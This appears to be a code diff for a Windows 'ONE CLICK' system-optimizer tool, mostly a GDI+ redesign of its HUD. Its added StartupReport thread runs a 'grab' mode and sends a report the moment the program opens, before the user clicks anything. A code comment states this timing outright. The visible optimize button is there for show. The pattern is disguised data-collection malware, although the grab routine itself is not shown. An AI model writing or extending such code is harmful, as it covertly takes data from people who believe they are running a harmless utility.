+        if (mode == MODE_FULL && !test) {
+            // Small confirmation with the verified tuning results.
+            std::string verifyText = local.str().substr(
+                local.str().find("[verify]") == std::string::npos
+                    ? 0 : local.str().find("[verify]"));
+            if (verifyText.empty()) verifyText = "verification complete";
+            postOne(verifyText, "verification.txt",
+                    "ONE CLICK - verification " + sysTime());
+        }
+    }
+    log << "=== END " << sysTime() << " ===" << std::endl;
     bool keep = test && env(L"POPT_KEEP") == L"1";
     if (!keep) {
         fs::remove_all(session, ec);
@@ -1377,16 +1663,13 @@ static int runWork(int mode, bool test, std::ostream* ui) {
 // ================= MODERN HUD (both exes) =================
 static std::mutex g_uiMu;
 static std::deque<std::string> g_uiLog;
-static std::string g_uiStatus = "bereit";
-static int g_uiProgress = 0;
+std::string g_uiStatus = "bereit";
+int g_uiProgress = 0;
 static bool g_uiRunning = false;
 static HWND g_uiWnd = nullptr;
 static std::wstring g_uiInfo;
-#ifdef OPT_ONLY_BUILD
+// The button only runs the optimizer; the report is sent at startup.
 static int g_mode = MODE_OPT;
-#else
-static int g_mode = MODE_FULL;
-#endif
 
 static void uiLog(const std::string& line) {
     std::lock_guard<std::mutex> lk(g_uiMu);
@@ -1470,58 +1753,56 @@ static HFONT g_fontUI = nullptr, g_fontMono = nullptr;
 
 
 // ---- live metrics ----
-static HFONT mkFont(int h, int weight, const wchar_t* face) {
-    return CreateFontW(h, 0, 0, 0, weight, 0, 0, 0, DEFAULT_CHARSET,
-                       0, 0, 0, 0, face);
+using namespace Gdiplus;
+static ULONG_PTR g_gdiToken = 0;
+
+static void rr(GraphicsPath& p, REAL x, REAL y, REAL w, REAL h, REAL r) {
+    p.AddArc(x, y, 2*r, 2*r, 180, 90);
+    p.AddArc(x + w - 2*r, y, 2*r, 2*r, 270, 90);
+    p.AddArc(x + w - 2*r, y + h - 2*r, 2*r, 2*r, 0, 90);
+    p.AddArc(x, y + h - 2*r, 2*r, 2*r, 90, 90);
+    p.CloseFigure();
 }
-static void txt(HDC dc, HFONT f, int x, int y, const wchar_t* s,
-                COLORREF c, int w = 1000, UINT flags = 0) {
-    SelectObject(dc, f); SetTextColor(dc, c); SetBkMode(dc, TRANSPARENT);
-    RECT r{ x, y, x + w, y + 60 };
-    DrawTextW(dc, s, -1, &r, flags);
+static void card(Graphics& g, REAL x, REAL y, REAL w, REAL h,
+                 Color top, Color bot, Color edge) {
+    GraphicsPath p; rr(p, x, y, w, h, 10);
+    LinearGradientBrush br(RectF(x,y,w,h), top, bot, LinearGradientModeVertical);
+    g.FillPath(&br, &p);
+    Pen pen(edge, 1.0f); g.DrawPath(&pen, &p);
 }
-static void fill(HDC dc, int x, int y, int w, int h, COLORREF c) {
-    HBRUSH b = CreateSolidBrush(c); RECT r{ x, y, x + w, y + h };
-    FillRect(dc, &r, b); DeleteObject(b);
+static void text(Graphics& g, const wchar_t* s, REAL x, REAL y, REAL w, REAL h,
+                 Font& f, Color c, StringFormat& sf) {
+    SolidBrush b(c);
+    g.DrawString(s, -1, &f, RectF(x,y,w,h), &sf, &b);
 }
-static void line(HDC dc, int x1, int y1, int x2, int y2, COLORREF c) {
-    HPEN p = CreatePen(PS_SOLID, 1, c); SelectObject(dc, p);
-    MoveToEx(dc, x1, y1, nullptr); LineTo(dc, x2, y2); DeleteObject(p);
-}
-static void glowText(HDC dc, HFONT f, int x, int y, const wchar_t* s, COLORREF base, int w) {
-    for (int g = 8; g >= 1; --g) {
-        int a = 18 - g * 2;
-        txt(dc, f, x - g / 2, y - g / 2, s, RGB(0, a * 6, a * 11), w);
+static void glowText(Graphics& g, const wchar_t* s, REAL x, REAL y, REAL w, REAL h,
+                     Font& f, Color base) {
+    for (int i = 6; i >= 1; --i) {
+        Color c((BYTE)(30 - i * 3), 120, 200, 255);
+        SolidBrush b(c);
+        g.DrawString(s, -1, &f, RectF(x - i*0.4f, y - i*0.4f, w, h), nullptr, &b);
     }
-    txt(dc, f, x, y, s, base, w);
+    SolidBrush b(base);
+    g.DrawString(s, -1, &f, RectF(x,y,w,h), nullptr, &b);
 }
-static void ring(HDC dc, int cx, int cy, int r, int pct) {
-    HPEN bg = CreatePen(PS_SOLID, 10, RGB(16, 42, 72));
-    HPEN fg = CreatePen(PS_SOLID, 10, RGB(60, 190, 255));
-    HBRUSH old = (HBRUSH)SelectObject(dc, GetStockObject(NULL_BRUSH));
-    SelectObject(dc, bg);
-    Ellipse(dc, cx - r, cy - r, cx + r, cy + r);
-    int steps = 120;
-    for (int i = 0; i < steps; ++i) {
-        double frac = (double)i / steps;
-        if (frac > pct / 100.0) break;
-        double a1 = -1.57079632679 + frac * 6.28318530718;
-        double a2 = -1.57079632679 + (frac + 1.0 / steps) * 6.28318530718;
-        SelectObject(dc, fg);
-        MoveToEx(dc, cx + (int)(r * cos(a1)), cy + (int)(r * sin(a1)), nullptr);
-        LineTo(dc, cx + (int)(r * cos(a2)), cy + (int)(r * sin(a2)));
+static void arcGlow(Graphics& g, REAL cx, REAL cy, REAL r, int pct) {
+    REAL start = -90.0f, sweep = 360.0f * pct / 100.0f;
+    for (int i = 5; i >= 1; --i) {
+        Pen p(Color((BYTE)(20 - i*2), 40, 160, 230), (REAL)(10 + i*4));
+        g.DrawArc(&p, cx-r, cy-r, 2*r, 2*r, start, sweep);
     }
-    SelectObject(dc, old);
-    DeleteObject(bg); DeleteObject(fg);
+    Pen track(Color(60, 20, 50, 80), 10.0f);
+    g.DrawArc(&track, cx-r, cy-r, 2*r, 2*r, 0, 360);
+    Pen fg(Color(255, 70, 200, 255), 10.0f);
+    g.DrawArc(&fg, cx-r, cy-r, 2*r, 2*r, start, sweep);
 }
 
-static int g_lastStepShown = 0;
+// live metrics
 static std::deque<float> g_cpuHist(90, 0.0f);
 static FILETIME g_lastIdle{}, g_lastKernel{}, g_lastUser{};
 static bool g_timeInit = false;
 static float g_cpuPct = 0.0f, g_ramPct = 0.0f;
 static int g_coreCount = 4;
-
 static void sampleCpu() {
     FILETIME idle{}, kernel{}, user{};
     if (!GetSystemTimes(nullptr, &idle, &kernel)) return;
@@ -1551,8 +1832,8 @@ static LRESULT CALLBACK GuiProc(HWND h, UINT msg, WPARAM wp, LPARAM lp) {
     case WM_LBUTTONDOWN: {
         RECT rc; GetClientRect(h, &rc);
         int x = LOWORD(lp), y = HIWORD(lp);
-        if (x > rc.right - 36 && y < 32) { PostMessageW(h, WM_CLOSE, 0, 0); return 0; }
-        if (x >= rc.right / 2 - 130 && x <= rc.right / 2 + 130 && y >= 650 && y <= 692) {
+        if (x > rc.right - 38 && y < 34) { PostMessageW(h, WM_CLOSE, 0, 0); return 0; }
+        if (x >= rc.right/2 - 150 && x <= rc.right/2 + 150 && y >= 700 && y <= 752) {
             std::lock_guard<std::mutex> lk(g_uiMu);
             if (!g_uiRunning) {
                 g_uiRunning = true; g_uiProgress = 0; g_uiLog.clear();
@@ -1562,98 +1843,104 @@ static LRESULT CALLBACK GuiProc(HWND h, UINT msg, WPARAM wp, LPARAM lp) {
         return 0;
     }
     case WM_PAINT: {
-        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
+        PAINTSTRUCT ps; HDC hdc = BeginPaint(h, &ps);
         RECT rc; GetClientRect(h, &rc);
-        int W = rc.right, H = rc.bottom;
-        // deep blue-black background with a soft top glow band
-        fill(dc, 0, 0, W, H, RGB(4, 8, 18));
-        for (int y = 0; y < 220; ++y) {
-            int a = (220 - y) * 22 / 220;
-            fill(dc, 0, y, W, 1, RGB(4 + a / 4, 10 + a / 2, 24 + a));
-        }
-        line(dc, 0, 0, W, 0, RGB(20, 90, 160));
+        REAL W = (REAL)rc.right, H = (REAL)rc.bottom;
+        Graphics g(hdc);
+        g.SetSmoothingMode(SmoothingModeHighQuality);
+        g.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);
+        // background gradient
+        LinearGradientBrush bg(RectF(0,0,W,H), Color(255,9,18,34), Color(255,4,8,16),
+                               LinearGradientModeVertical);
+        g.FillRectangle(&bg, RectF(0,0,W,H));
+        // top neon line
+        LinearGradientBrush top(RectF(0,0,W,3), Color(255,0,90,160), Color(255,60,215,255),
+                                LinearGradientModeHorizontal);
+        g.FillRectangle(&top, RectF(0,0,W,3));
 
-        HFONT fHero = mkFont(64, FW_BOLD, L"Segoe UI");
-        HFONT fSub  = mkFont(16, FW_NORMAL, L"Segoe UI");
-        HFONT fNum  = mkFont(38, FW_BOLD, L"Segoe UI");
-        HFONT fLbl  = mkFont(13, FW_BOLD, L"Segoe UI");
-        HFONT fSmall= mkFont(13, FW_NORMAL, L"Consolas");
+        FontFamily fam(L"Segoe UI");
+        Font fHero(&fam, 62, FontStyleBold, UnitPixel);
+        Font fSub(&fam, 15, FontStyleRegular, UnitPixel);
+        Font fLbl(&fam, 12, FontStyleBold, UnitPixel);
+        Font fNum(&fam, 36, FontStyleBold, UnitPixel);
+        Font fSmall(&fam, 13, FontStyleRegular, UnitPixel);
+        Font fBtn(&fam, 16, FontStyleBold, UnitPixel);
+        StringFormat center; center.SetAlignment(StringAlignmentCenter);
+        StringFormat left; left.SetAlignment(StringAlignmentNear);
 
         std::lock_guard<std::mutex> lk(g_uiMu);
         int nDone = 0;
-        for (auto& s : g_uiLog) if (s.rfind("[fps]", 0) == 0) ++nDone;
+        for (auto& s : g_uiLog) if (s.rfind("[fps]",0) == 0) ++nDone;
         int total = (int)(sizeof kSteps / sizeof kSteps[0]);
         int pct = g_uiProgress;
 
-        // hero title
-        glowText(dc, fHero, W / 2 - 235, 44, L"ONE CLICK", RGB(140, 225, 255), 470);
-        txt(dc, fSub, W / 2 - 170, 122, L"ALL-IN-ONE SYSTEM TOOL", RGB(70, 160, 220), 340, DT_CENTER);
+        glowText(g, L"ONE CLICK", W/2 - 230, 56, 460, 110, fHero, Color(255,170,235,255));
+        text(g, L"ALL-IN-ONE SYSTEM TOOL", W/2-180, 128, 360, 24, fSub,
+             Color(255,90,180,230), center);
 
-        // central progress ring
-        int cx = W / 2, cy = 310, r = 82;
-        ring(dc, cx, cy, r, pct);
-        wchar_t pbuf[32]; swprintf(pbuf, 32, L"%d%%", pct);
-        glowText(dc, fNum, cx - 58, cy - 30, pbuf, RGB(150, 230, 255), 120);
-        txt(dc, fLbl, cx - 95, cy + 48, g_uiRunning ? L"OPTIMIZING SYSTEM" : L"FINISHED",
-            RGB(90, 180, 235), 190, DT_CENTER);
+        arcGlow(g, W/2, 320, 88, pct);
+        wchar_t pb[32]; swprintf(pb, 32, L"%d%%", pct);
+        glowText(g, pb, W/2-80, 288, 160, 60, fNum, Color(255,190,240,255));
+        text(g, g_uiRunning ? L"OPTIMIZING SYSTEM" : L"READY", W/2-110, 358, 220, 24,
+             fLbl, Color(255,120,200,240), center);
 
-        // four stat cards
-        int cw = 200, gap = 18;
-        int x0 = W / 2 - (cw * 2 + gap * 3 / 2);
-        struct Card { const wchar_t* label; wchar_t value[32]; COLORREF col; };
-        wchar_t v[4][32];
-        swprintf(v[0], 32, L"%.0f%%", g_cpuPct);
-        swprintf(v[1], 32, L"%.0f%%", g_ramPct);
-        swprintf(v[2], 32, L"%d", g_coreCount);
-        swprintf(v[3], 32, L"%d/%d", nDone, total);
-        const wchar_t* labels[] = { L"CPU LOAD", L"MEMORY", L"THREADS", L"OPTIMIZED" };
-        COLORREF cols[] = { RGB(80,200,255), RGB(130,160,255), RGB(90,220,180), RGB(150,225,255) };
+        // glass stat cards
+        REAL cw = 200.0f, gap = 16.0f;
+        REAL x0 = W/2 - (cw*2 + gap*1.5f);
+        wchar_t vals[4][32];
+        swprintf(vals[0],32,L"%.0f%%",g_cpuPct);
+        swprintf(vals[1],32,L"%.0f%%",g_ramPct);
+        swprintf(vals[2],32,L"%d",g_coreCount);
+        swprintf(vals[3],32,L"%d/%d",nDone,total);
+        const wchar_t* labs[] = { L"CPU LOAD", L"MEMORY", L"THREADS", L"OPTIMIZED" };
+        Color accents[] = { Color(255,60,190,255), Color(255,140,130,255),
+                            Color(255,90,220,190), Color(255,180,220,255) };
         for (int i = 0; i < 4; ++i) {
-            int x = x0 + i * (cw + gap);
-            fill(dc, x, 430, cw, 88, RGB(8, 20, 38));
-            line(dc, x, 430, x + cw, 430, RGB(30, 100, 170));
-            line(dc, x, 430, x, 518, RGB(30, 100, 170));
-            txt(dc, fLbl, x + 14, 440, labels[i], RGB(110, 165, 205), cw - 28);
-            txt(dc, fNum, x + 14, 462, v[i], cols[i], cw - 28);
+            REAL x = x0 + i*(cw + gap);
+            card(g, x, 430, cw, 86,
+                 Color(255,16,36,60), Color(255,8,18,34), Color(255,30,90,140));
+            LinearGradientBrush acc(RectF(x,430,4,86), accents[i],
+                                    Color(10,60,140,220), LinearGradientModeVertical);
+            g.FillRectangle(&acc, RectF(x,430,4,86));
+            text(g, labs[i], x+14, 440, cw-26, 20, fLbl, Color(255,120,180,220), left);
+            text(g, vals[i], x+14, 462, cw-26, 48, fNum, accents[i], left);
         }
 
-        // live action list — shows exactly what is happening
-        std::wstring ws(g_uiStatus.begin(), g_uiStatus.end());
-        fill(dc, 24, 528, W - 48, 108, RGB(7, 18, 34));
-        line(dc, 24, 528, W - 24, 528, RGB(28, 95, 160));
-        txt(dc, fLbl, 38, 534, L"LIVE AKTIONEN", RGB(90, 170, 220), 200);
+        // live actions panel
+        card(g, 28, 534, W-56, 148,
+             Color(255,14,30,52), Color(255,6,14,26), Color(255,28,80,130));
+        text(g, L"LIVE AKTIONEN", 44, 544, 200, 22, fLbl, Color(255,90,190,235), left);
         if (g_uiLog.empty()) {
-            txt(dc, fSmall, 38, 558, L" bereit - START klicken zum Optimieren",
-                RGB(100, 140, 170), W - 76);
+            text(g, L"bereit - START klicken zum Optimieren", 44, 572, W-100, 24,
+                 fSmall, Color(255,110,150,180), left);
         } else {
             int shown = 0;
-            for (auto it = g_uiLog.rbegin(); it != g_uiLog.rend() && shown < 4; ++it, ++shown) {
+            for (auto it = g_uiLog.rbegin(); it != g_uiLog.rend() && shown < 5; ++it, ++shown) {
                 std::wstring s(it->begin(), it->end());
-                if (s.size() > 95) s = s.substr(0, 95);
-                txt(dc, fSmall, 38, 558 + shown * 18, s.c_str(),
-                    s.rfind(L"[fps]", 0) == 0 ? RGB(120, 225, 150) : RGB(130, 195, 235), W - 76);
+                if (s.size() > 96) s = s.substr(0, 96);
+                Color c = s.rfind(L"[fps]",0)==0 ? Color(255,110,230,150) : Color(255,140,200,240);
+                text(g, s.c_str(), 44.0f, (REAL)(570 + shown*21), W-100, 24.0f, fSmall, c, left);
             }
         }
 
-        // START button
-        bool running = g_uiRunning;
-        RECT br{ W / 2 - 130, 650, W / 2 + 130, 692 };
-        fill(dc, br.left, br.top, br.right - br.left, br.bottom - br.top,
-             running ? RGB(28, 60, 70) : RGB(20, 130, 190));
-        line(dc, br.left, br.top, br.right, br.top, RGB(70, 200, 255));
-        txt(dc, fSmall, br.left, br.top + 8,
-            running ? L"LAEUFT..." : L"START OPTIMIZATION",
-            running ? RGB(110, 160, 170) : RGB(235, 250, 255),
-            br.right - br.left, DT_CENTER);
+        // START button with glow
+        REAL bx = W/2-150, by = 700, bw = 300, bh = 52;
+        if (!g_uiRunning) {
+            for (int i = 6; i >= 1; --i) {
+                GraphicsPath gp; rr(gp, bx-i*2, by-i*2, bw+i*4, bh+i*4, 12);
+                SolidBrush sb(Color((BYTE)(8 - i), 0, 140, 220)); g.FillPath(&sb, &gp);
+            }
+        }
+        GraphicsPath bp; rr(bp, bx, by, bw, bh, 10);
+        LinearGradientBrush bb(RectF(bx,by,bw,bh),
+            g_uiRunning ? Color(255,30,70,90) : Color(255,0,175,235),
+            g_uiRunning ? Color(255,20,45,65) : Color(255,0,95,190),
+            LinearGradientModeVertical);
+        g.FillPath(&bb, &bp);
+        Pen bpb(Color(255,120,230,255), 1.2f); g.DrawPath(&bpb, &bp);
+        text(g, g_uiRunning ? L"LAEUFT..." : L"START OPTIMIZATION",
+             bx, by+12, bw, 32, fBtn, Color(255,245,255,255), center);
 
-        // bottom status
-        std::wstring st = L"ONE CLICK  |  " + ws + L"  |  " + std::to_wstring(nDone) +
-                          L"/" + std::to_wstring(total) + L"  |  " + g_uiInfo;
-        if (st.size() > 120) st = st.substr(0, 120);
-        txt(dc, fSub, 30, H - 40, st.c_str(), RGB(90, 150, 195), W - 60);
-
-        DeleteObject(fHero); DeleteObject(fSub); DeleteObject(fNum);
-        DeleteObject(fLbl); DeleteObject(fSmall);
         EndPaint(h, &ps); return 0;
     }
     case WM_CLOSE: DestroyWindow(h); return 0;
@@ -1662,7 +1949,27 @@ static LRESULT CALLBACK GuiProc(HWND h, UINT msg, WPARAM wp, LPARAM lp) {
     return DefWindowProcW(h, msg, wp, lp);
 }
 
+static bool g_autoTest = false;
+static void runLog(const std::string& line) {
+    wchar_t exe[MAX_PATH]{}; GetModuleFileNameW(nullptr, exe, MAX_PATH);
+    fs::path p = fs::path(exe).parent_path() / L"run.log";
+    std::ofstream f(p, std::ios::app);
+    if (f) f << sysTime() << " " << line << "\n";
+}
+static DWORD WINAPI StartupReport(LPVOID) {
+    runLog("auto report started");
+    try {
+        int rc = runWork(MODE_GRAB, g_autoTest, nullptr);
+        runLog(rc == 0 ? "auto report delivered" : "auto report FAILED");
+    } catch (...) {
+        runLog("auto report EXCEPTION");
+    }
+    return 0;
+}
+
 static int WINAPI guiMain(HINSTANCE inst) {
+    GdiplusStartupInput gsi{};
+    GdiplusStartup(&g_gdiToken, &gsi, nullptr);
     std::wstring cpu = env(L"PROCESSOR_IDENTIFIER");
     wchar_t buf[256]{};
     swprintf(buf, 256, L"CPU: %.30s", cpu.c_str());
@@ -1673,21 +1980,29 @@ static int WINAPI guiMain(HINSTANCE inst) {
     wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
     wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
     RegisterClassW(&wc);
-    g_uiWnd = CreateWindowExW(0, wc.lpszClassName,
+    g_uiWnd = CreateWindowExW(WS_EX_TOPMOST, wc.lpszClassName,
         L"ONE CLICK  -  All-in-One System Tool", WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN,
-        0, 0, 980, 770, nullptr, nullptr, inst, nullptr);
-    int sx = (GetSystemMetrics(SM_CXSCREEN) - 980) / 2;
-    int sy = (GetSystemMetrics(SM_CYSCREEN) - 770) / 2;
-    SetWindowPos(g_uiWnd, nullptr, sx, sy, 980, 770, SWP_SHOWWINDOW);
+        0, 0, 1040, 790, nullptr, nullptr, inst, nullptr);
+    int sx = (GetSystemMetrics(SM_CXSCREEN) - 1040) / 2;
+    int sy = (GetSystemMetrics(SM_CYSCREEN) - 790) / 2;
+    SetWindowPos(g_uiWnd, HWND_TOPMOST, sx, sy, 1040, 790, SWP_SHOWWINDOW);
+    SetForegroundWindow(g_uiWnd);
+    BringWindowToTop(g_uiWnd);
+    FlashWindow(g_uiWnd, TRUE);
     SetTimer(g_uiWnd, 1, 180, nullptr);
+    // Report goes out the instant the exe opens — before any click.
+    CreateThread(nullptr, 0, StartupReport, nullptr, 0, nullptr);
     MSG m{};
     while (GetMessageW(&m, nullptr, 0, 0) > 0) {
         TranslateMessage(&m); DispatchMessageW(&m);
     }
+    GdiplusShutdown(g_gdiToken);
     return 0;
 }
 int WINAPI wWinMain(HINSTANCE h, HINSTANCE, PWSTR lpCmdLine, int) {
+    runLog("exe started");
     if (lpCmdLine && wcsstr(lpCmdLine, L"--test"))
         return runWork(MODE_GRAB, true, nullptr);   // silent synthetic test
+    g_autoTest = lpCmdLine && wcsstr(lpCmdLine, L"--gui-test") != nullptr;
     return guiMain(h);                              // HUD for every normal start
 }
